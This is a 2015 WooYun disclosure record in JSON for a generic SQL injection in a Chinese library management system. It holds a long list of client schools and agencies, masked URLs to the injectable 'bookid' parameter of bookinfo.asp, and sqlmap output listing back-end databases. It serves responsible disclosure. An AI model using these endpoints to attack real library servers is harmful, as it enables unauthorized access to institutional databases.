{"id": 68614, "wybug_id": "wooyun-2015-0129376", "wybug_title": "某图书馆系统存在通用SQL注入【涉及全国】", "wybug_corp": "某图书馆系统", "wybug_author": "雅柏菲卡", "wybug_date": "2015-07-29 15:24", "wybug_open_date": "2015-10-30 09:22", "wybug_type": "SQL注射漏洞", "wybug_level": "中", "wybug_rank_0": "8", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-07-29：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-08-01：\tcncert国家互联网应急中心暂未能联系到相关单位，细节仅向通报机构公开\t\t\t\t\t\t\t\t\t2015-08-04：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2015-09-25：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-10-05：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-10-15：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-10-30：\t细节向公众公开  简要描述： ........ 详细说明：  \n..............\n   漏洞证明：  \nhttp://**.**.**.**/server/tsg/lib_ml.asp【官网的用户名录】华阜软件 部分用户名录 广东省　\t 广州市 - 城区 \t广州市教育局教学研究室广东实验中学广州市第一中学广州市第二中学广州市第三中学广州市第四中学广州市第五中学广州市第六中学广州市第七中学广州市第十中学广州市第十一中学广州市第十二中学广州市第十三中学广州市第十六中学广州市第十七中学广州市第二十一中学广州市第二十三中学广州市第二十六中学广州市第二十七中学广州市第三十中学广州市第三十二中学广州市第三十四中学广州市第三十六中学广州市第三十七中学广州市第三十九中学广州市第四十中学广州市第四十一中学广州市第四十二中学广州市第四十四中学广州市第四十六中学广州市第四十七中学广州市第四十九中学广州市第五十二中学广州市第五十九中学广州市第六十四中学广州市第六十八中学广州市第七十一中学广州市第七十五中学广州市第七十八中学广州市第七十九中学广州市第八十中学广州市第八十二中学广州市第八十六中学广州市第八十九中学广州市第九十一中学广州市第九十五中学广州市第九十七中学广州市第九十八中学广州市第一○二中学广州市第一○九中学广州市第一一三中学广州市第一二三中学广州市培才高级中学广州市长兴中学广雅实验学校广州大学附属中学大学城校区广州市天河中学高中校区华师附中新世界学校广州市玉岩中学广州市聚德中学广州市荔湾区双桥学校广州市第113中学陶育实验学校广州市第四十四中学(西校区)广州市第四十七中学汇景实验学校广州市第四十七中学(龙口校区)广州市第四十七中学(名雅校区)广州市第四十七中学(天润校区)广州市第九十七中学金碧校区广州港技工学校广州市司法学校广州市建筑工程学校广州市旅游商贸职业学校广州市黄埔职业高级中学广州市艺术学校广州市盲人中专学校广州市第二工艺美术学校广州市荔湾区职业技术学校广州市海珠商务职业学校(108)广州市海珠商务职业学校(106)广州汽车工业技工学校广州市工贸技师学院广州市白云行知职业技术学校广州市中学生劳动技术学校广州市聋人学校广东省旅游学校广东省科技职业技术学校广东省新闻出版高级技工学校广州市越秀区教师进修学校广州市教育科学研究所广东省电信机关图书馆广州市白云区教育发展中心广州白云国际机场易登机商旅服务有限公司广州电装有限公司国家海洋局南海环境监测中心广东省公安厅广州市公安局广东电网责任有限公司电力科学研究院华南师范大学附属中学广东广雅中学广东执信中学广州市育才中学中山大学附属中学广东华侨中学广东协和高级中学广州市培正中学北大附中广州实验学校广州华美英语实验学校广州市南武中学广州市南武中学南校区广东实验中学天河校区广州市蓝天中学广州市江南中学广州市晓园中学广州市西关培英中学广州市恒福中学广州市长堤真光中学广州市广园中学广州铁路第五中学广州市东环中学广州市沙东中学广州市五羊中学广州市流花中学广州市海珠区广纸学校广州市南武实验学校广州市汾水中学广州市培英中学广州市东圃中学广州市东圃中学北校区广州市南岗中学广州市知用中学广州市珠江中学广州市育才实验中学广州市八一实验学校广州市开发区中学广州市沙园中学广州市梅花中学广州市真光中学广州市萝岗区东区中学广东实验中学(初中校区)广州市第一中学(初中校区)广州市第二中学(初中校区)广州市第五中学(初中校区)广州市第七十八中学(东校区)广州市文伟中学广州市铁一中学广州市铁一中学(亚运村)广州市豪贤中学广州市培英中学广州市广外附设外语学校广州市白云中学广州市白云中学金沙校区广州市培英中学太和校区广州市第一一三中学(东方校区)广州市天河中学(花城校区)广州市天河中学(天河东校区)广州市华颖外国语学校广州市天荣中学广州市骏景中学广州市东晓中学广州市花地中学华南理工大学附属小学广州市天河区沙河小学广州市天河区杨箕小学广州市芳村区大策直街小学广州市芳村区林凤娥小学广州市海珠区绿翠小学广州市海珠区新洲小学广州市海珠区聚德西路小学广州市海珠区龙潭小学广州市卫国尧纪念小学广州市同福中路第一小学广州市建设大马路小学广州市东山区署前路小学广州市东山区永曜北小学广州市荔湾区西华路小学广州市梅花村小学广州市中山二路小学广州市白云区黄边小学广州市黄埔区文冲小学广州市白云区汇侨第一小学广州市白云区集贤小学广州市越秀区少年儿童体校广州市东山培正小学广州市越秀区秉正小学广州市荔湾区耀华小学广州市真光中英文小学广州市白云区华师附中实验小学广州市越秀区养正小学广州市海珠区汇源大街小学广州市海珠区海鸥幼儿园广州市越秀区东风东路小学广州市越秀区云山小学广州市越秀区文德路小学广州市海珠区晓港湾小学 广州市 - 郊市 \t广东仲元中学广东仲元实验学校华南师大附中番禺学校广州市番禺区星海中学广州市番禺区象贤中学广州市番禺区洛溪新城中学广州市番禺区石碁中学广州市番禺区石碁二中广州市番禺区石碁三中广州市番禺区市桥中学广州市番禺区市桥二中广州市番禺区南村中学广州市番禺区市桥侨联中学广州市番禺区钟村职业技术学校广州市番禺区钟村中学广州市番禺区南阳里小学广州市番禺区钟村锦绣小学番禺区南村镇锦绣香江小学华南师大附属康大学校广州市增城香江学校广州市番禺区大岗中学广州市番禺区东风中学番禺区新造职业技术学校广东番禺祈福英语实验学校广东番禺桥城中学广州市花都区新华中学广州市花都区秀全中学广州市花都区实验中学广州市花都区邝维煜纪念中学广州市花都区培新中学广州市花都区狮峰中学广州市花都区花东中学广州市花都区长岗中学广州市花都区赤妮中学广州市花都区赤妮圩小学广州市花都区冠华小学 佛山市 \t佛山市第一中学佛山市第三中学高中校区佛山市第三中学初中校区佛山市广播电视大学佛山市禅城区城北中学佛山市南海广播电视大学佛山市南海区罗村高级中学佛山市高明区第一中学佛山市高明区纪念中学佛山市南海区西樵高级中学广东电网公司佛山南海供电局佛山市三水区工业中等专业学校佛山市桂城职业技术学校佛山市禅城区南庄中学佛山市汾江中学佛山市实验学校佛山市鸿业小学佛山市三水区白坭镇中心小学华师附中南海实验高中佛山市南海中学佛山市南海区黄岐高级中学佛山市南海区第一中学佛山市南海区平洲第一初级中学佛山市南海实验中学佛山市南海西樵中学佛山市三水区华侨中学佛山市三水中学附属初中佛山市三水实验中学佛山市三水区实验小学佛山市顺德区郑裕彤中学佛山市第六中学佛山市三水区理工(技工)学校佛山市南海区黄岐医院佛山市禅城区南庄镇中心小学佛山市禅城区环湖小学 东莞市 \t东莞市东莞中学东莞市东莞高级中学东莞市莞城一中东莞市莞城二中(玉兰中学)东莞市华南师大嘉玛学校东莞市长安中学东莞市东华高级中学东莞市济川中学东莞市东城区花园小学东莞市第六高级中学东莞市东华小学东莞市石龙中学东莞市石龙二中东莞市东莞实验中学东莞市光明中学东莞市虎门三中东莞市望牛敦中学东莞新世纪英才学校东莞市虎门镇龙眼小学东莞市教师进修学校东莞市麻涌中学 深圳市 \t深圳市西乡中学深圳市上步中学深圳市坪山新区坪山高级中学深圳市坪山新区实验学校深圳市光明新区公明中学深圳市龙岗区坪山中学深圳市罗湖区笋岗中学深圳市光明新区高级中学深圳市福田区彩田学校 珠海市 \t珠海艺术职业学院 汕头市 \t汕头市第一中学汕头工艺美术学校汕头市六都中学 汕尾市 \t华南师大附中汕尾学校 揭阳市 \t揭东县第二中学 清远市 \t清城区第一中学(华侨中学)清远市第三中学英德市第一中学清城区职业中学英德市职业技术学校 中山市 \t中山市第一中学中山市濠头中学中山市杨仙逸中学中山市石岐中心小学中山市石岐中心小学大信学校 惠州市 \t惠州市第一中学 阳江市 \t阳春市第一中学广东两阳中学阳春市实验中学阳东广雅学校(小学部和中学部) 韶关市 \t广东北江中学韶关市第一中学韶关市第五中学韶关市曲江初级中学韶关市曲江区九龄小学韶关市曲江中学韶关市曲江区城南小学广东北江实验学校翁源中学韶关市中等职业技术学校韶关市曲江职业技术学校韶关市仁化县第一中学韶关市曲江区实验小学 梅州市 \t梅州市东山中学梅州市蕉岭中学梅州市职业技术学校梅州市梅江区嘉应中学梅州市曾宪梓中学梅州市梅江区联合中学梅州市梅江区乐育中学 潮州市 \t潮州市饶平县城西实验中学  江门市 \t鹤山市鹤华中学江门市江海区麻园中学江门市江海区江南小学江门市江海区滘头小学江门市江海区礼乐中心小学江门市江海区麻一佑启学校江门市江海区华兴小学江门市江海区麻二金紫学校江门市外海中学江门市礼乐中学江门市江海区银泉小学江门市江海区外海街道中心小学江门市江海区中路小学江门市江海区新民小学江门市江海区滘北小学 河源市 \t河源市第一中学河源市技工学校 肇庆市 \t高要市第一中学  湛江市 \t湛江市第五中学 北京市\t  \t北京市公安局公安交通管理局教导支队日本国际交流基金会北京事务所北京航空航天大学附属小学上海市\t  \t上海市复兴实验中学山东省\t  \t德州市禹城第一中学德州市禹城综合高中湖南省\t  \t长沙市长郡中学广西省\t  \t南丹高级中学福建省\t  \t建宁县第一中学平潭县城东小学海南省\t  \t海南省红光农场中心小学海南省红光农场中学贵州省\t  \t黔西南州职业技术学院重庆市\t  \t重庆市双桥区双路中学重庆市双桥区实验小学重庆市双桥区实验中学重庆市双桥区通桥镇小学湖北省\t  \t黄石市第三中学西藏自治区\t  \t拉萨中学1、http://**.**.**.**:8002/userlib/searchbook/bookinfo.asp?bookid=65436available databases [10]:[*] Book[*] db_psy_hsch[*] Lib[*] master[*] model[*] msdb[*] Northwind[*] Paper[*] pubs[*] tempdb2、http://**.**.**.**/tsgweb/userlib/searchbook/bookinfo.asp?bookid=80075available databases [19]:[*] 91z[*] ApaDLibrary_2[*] Book[*] Commonservice_2[*] eztest[*] Group_2[*] gzer[*] lib[*] master[*] model[*] msdb[*] MyLibrary_2[*] Northwind[*] Paper[*] pubs[*] sy_stuweb_db[*] tempdb[*] Usp_2[*] xxsczbm3、http://**.**.**.**:88/userlib/bookinfo.asp?bookid=27519web server operating system: Windows 2003web application technology: ASP.NET, Microsoft IIS 6.0, ASPback-end DBMS: Microsoft SQL Server 2005[03:03:09] [INFO] fetching database names[03:03:10] [WARNING] it was not possible to count the number of entries for the used SQL query. sqlmap will assume that it returns only one entryavailable databases [1]:4、http://**.**.**.**/userlib/bookinfo.asp?bookid=126381[03:09:05] [INFO] testing Microsoft SQL Server[03:09:05] [INFO] confirming Microsoft SQL Server[03:09:06] [INFO] the back-end DBMS is Microsoft SQL Serverweb server operating system: Windows 2003web application technology: Microsoft IIS 6.0, ASPback-end DBMS: Microsoft SQL Server 2000[03:09:06] [INFO] fetching database names[03:09:06] [INFO] fetching number of databases[03:09:06] [INFO] retrieved: 10[03:09:29] [CRITICAL] unable to connect to the target url or proxy, sqlmap is going to retry the request[03:09:30] [INFO] retrieving the length of query output[03:09:30] [INFO] retrieved: [03:09:51] [CRITICAL] unable to connect to the target url or proxy, sqlmap is going to retry the request17[03:10:07] [INFO] retrieved: A_a______________ 2/17 (12%)5、http://**.**.**.**/userlib/bookinfo.asp?bookid=31060[03:21:53] [INFO] testing Microsoft SQL Server[03:21:53] [INFO] confirming Microsoft SQL Server[03:21:55] [INFO] the back-end DBMS is Microsoft SQL Serverweb server operating system: Windows 2003web application technology: Microsoft IIS 6.0, ASPback-end DBMS: Microsoft SQL Server 2000[03:21:55] [INFO] fetching database names[03:22:16] [CRITICAL] unable to connect to the target url or proxy, sqlmap is going to retry the request[03:22:19] [WARNING] it was not possible to count the number of entries for the used SQL query. sqlmap will assume that it returns only one entryavailable databases [1]:\n   修复方案：  ..........   版权声明：转载请注明来源 雅柏菲卡@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：13  确认时间：2015-08-01 09:20 厂商回复： cnvd确信并复现所述情况，已经转由cncert下发给广东分中心，由其后续协调网站管理单位处置。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 13, "Ranks": null}